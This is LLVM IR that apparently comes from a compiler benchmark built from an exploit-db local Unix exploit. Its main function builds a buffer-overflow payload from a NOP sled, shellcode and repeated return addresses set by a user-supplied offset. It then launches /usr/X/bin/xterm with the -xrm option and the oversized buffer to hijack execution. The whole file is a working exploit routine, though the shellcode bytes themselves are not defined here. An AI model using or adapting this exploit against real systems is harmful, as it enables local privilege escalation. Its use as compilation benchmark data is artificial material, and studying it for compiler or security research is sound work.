; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19202.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_19202.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER_SIZE = common dso_local global i32 0, align 4
@RET_LENGTH = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [30 x i8] c"Usage: %s [command] [offset]\0A\00", align 1
@shell = common dso_local global i8* null, align 8
@LEN = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"start_address = 0x%x\0A\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"ret = 0x%x,\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"offset = %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"command = %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"buffer size = %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"/usr/X/bin/xterm\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"xterm\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"-xrm\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"exec failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4 x i8], align 1
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @BUFFER_SIZE, align 4
  %18 = load i32, i32* @RET_LENGTH, align 4
  %19 = mul nsw i32 %18, 4
  %20 = add nsw i32 %17, %19
  %21 = add nsw i32 %20, 1
  %22 = zext i32 %21 to i64
  %23 = call i8* @llvm.stacksave()
  store i8* %23, i8** %7, align 8
  %24 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %8, align 8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 3
  br i1 %26, label %30, label %27

27:                                               ; preds = %2
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %28, 2
  br i1 %29, label %30, label %37

30:                                               ; preds = %27, %2
  %31 = load i32, i32* @stderr, align 4
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @fprintf(i32 %31, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i8* %34)
  %36 = call i32 @exit(i32 1) #4
  unreachable

37:                                               ; preds = %27
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  store i8* %40, i8** %9, align 8
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 3
  br i1 %42, label %43, label %48

43:                                               ; preds = %37
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 2
  %46 = load i8*, i8** %45, align 8
  %47 = call i64 @atol(i8* %46)
  store i64 %47, i64* %10, align 8
  br label %49

48:                                               ; preds = %37
  store i64 0, i64* %10, align 8
  br label %49

49:                                               ; preds = %48, %43
  %50 = load i8*, i8** %9, align 8
  %51 = call i32 @strlen(i8* %50)
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = sub nsw i32 0, %54
  store i32 %55, i32* %13, align 4
  %56 = load i32, i32* %13, align 4
  %57 = ashr i32 %56, 0
  %58 = and i32 %57, 255
  %59 = trunc i32 %58 to i8
  %60 = load i8*, i8** @shell, align 8
  %61 = load i32, i32* @LEN, align 4
  %62 = add nsw i32 %61, 0
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %60, i64 %63
  store i8 %59, i8* %64, align 1
  %65 = load i32, i32* %13, align 4
  %66 = ashr i32 %65, 8
  %67 = and i32 %66, 255
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** @shell, align 8
  %70 = load i32, i32* @LEN, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 %68, i8* %73, align 1
  %74 = load i32, i32* %13, align 4
  %75 = ashr i32 %74, 16
  %76 = and i32 %75, 255
  %77 = trunc i32 %76 to i8
  %78 = load i8*, i8** @shell, align 8
  %79 = load i32, i32* @LEN, align 4
  %80 = add nsw i32 %79, 2
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  store i8 %77, i8* %82, align 1
  %83 = load i32, i32* %13, align 4
  %84 = ashr i32 %83, 24
  %85 = and i32 %84, 255
  %86 = trunc i32 %85 to i8
  %87 = load i8*, i8** @shell, align 8
  %88 = load i32, i32* @LEN, align 4
  %89 = add nsw i32 %88, 3
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %87, i64 %90
  store i8 %86, i8* %91, align 1
  %92 = ptrtoint [4 x i8]* %6 to i64
  store i64 %92, i64* %12, align 8
  %93 = load i64, i64* %10, align 8
  %94 = sub nsw i64 134510864, %93
  store i64 %94, i64* %11, align 8
  store i32 0, i32* %14, align 4
  br label %95

95:                                               ; preds = %104, %49
  %96 = load i32, i32* %14, align 4
  %97 = load i32, i32* @BUFFER_SIZE, align 4
  %98 = icmp slt i32 %96, %97
  br i1 %98, label %99, label %107

99:                                               ; preds = %95
  %100 = load i8, i8* @NOP, align 1
  %101 = load i32, i32* %14, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %24, i64 %102
  store i8 %100, i8* %103, align 1
  br label %104

104:                                              ; preds = %99
  %105 = load i32, i32* %14, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %95

107:                                              ; preds = %95
  %108 = load i32, i32* @BUFFER_SIZE, align 4
  %109 = load i8*, i8** %9, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = sub nsw i32 %108, %110
  %112 = load i8*, i8** @shell, align 8
  %113 = call i32 @strlen(i8* %112)
  %114 = sub nsw i32 %111, %113
  store i32 %114, i32* %14, align 4
  store i32 0, i32* %15, align 4
  br label %115

115:                                              ; preds = %130, %107
  %116 = load i32, i32* %15, align 4
  %117 = load i8*, i8** @shell, align 8
  %118 = call i32 @strlen(i8* %117)
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %133

120:                                              ; preds = %115
  %121 = load i8*, i8** @shell, align 8
  %122 = load i32, i32* %15, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %121, i64 %123
  %125 = load i8, i8* %124, align 1
  %126 = load i32, i32* %14, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %14, align 4
  %128 = sext i32 %126 to i64
  %129 = getelementptr inbounds i8, i8* %24, i64 %128
  store i8 %125, i8* %129, align 1
  br label %130

130:                                              ; preds = %120
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %15, align 4
  br label %115

133:                                              ; preds = %115
  store i32 0, i32* %15, align 4
  br label %134

134:                                              ; preds = %149, %133
  %135 = load i32, i32* %15, align 4
  %136 = load i8*, i8** %9, align 8
  %137 = call i32 @strlen(i8* %136)
  %138 = icmp slt i32 %135, %137
  br i1 %138, label %139, label %152

139:                                              ; preds = %134
  %140 = load i8*, i8** %9, align 8
  %141 = load i32, i32* %15, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8, i8* %140, i64 %142
  %144 = load i8, i8* %143, align 1
  %145 = load i32, i32* %14, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %14, align 4
  %147 = sext i32 %145 to i64
  %148 = getelementptr inbounds i8, i8* %24, i64 %147
  store i8 %144, i8* %148, align 1
  br label %149

149:                                              ; preds = %139
  %150 = load i32, i32* %15, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %15, align 4
  br label %134

152:                                              ; preds = %134
  store i32 0, i32* %15, align 4
  br label %153

153:                                              ; preds = %164, %152
  %154 = load i32, i32* %15, align 4
  %155 = load i32, i32* @RET_LENGTH, align 4
  %156 = icmp slt i32 %154, %155
  br i1 %156, label %157, label %169

157:                                              ; preds = %153
  %158 = load i64, i64* %11, align 8
  %159 = trunc i64 %158 to i32
  %160 = load i32, i32* %14, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8, i8* %24, i64 %161
  %163 = bitcast i8* %162 to i32*
  store i32 %159, i32* %163, align 1
  br label %164

164:                                              ; preds = %157
  %165 = load i32, i32* %15, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %15, align 4
  %167 = load i32, i32* %14, align 4
  %168 = add nsw i32 %167, 4
  store i32 %168, i32* %14, align 4
  br label %153

169:                                              ; preds = %153
  %170 = load i32, i32* %14, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds i8, i8* %24, i64 %171
  store i8 0, i8* %172, align 1
  %173 = load i64, i64* %12, align 8
  %174 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i64 %173)
  %175 = load i64, i64* %11, align 8
  %176 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0), i64 %175)
  %177 = load i64, i64* %10, align 8
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0), i64 %177)
  %179 = load i8*, i8** %9, align 8
  %180 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* %179)
  %181 = call i32 @strlen(i8* %24)
  %182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0), i32 %181)
  %183 = call i32 @execl(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i8* %24, i32* null)
  %184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0))
  %185 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %185)
  %186 = load i32, i32* %3, align 4
  ret i32 %186
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @atol(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
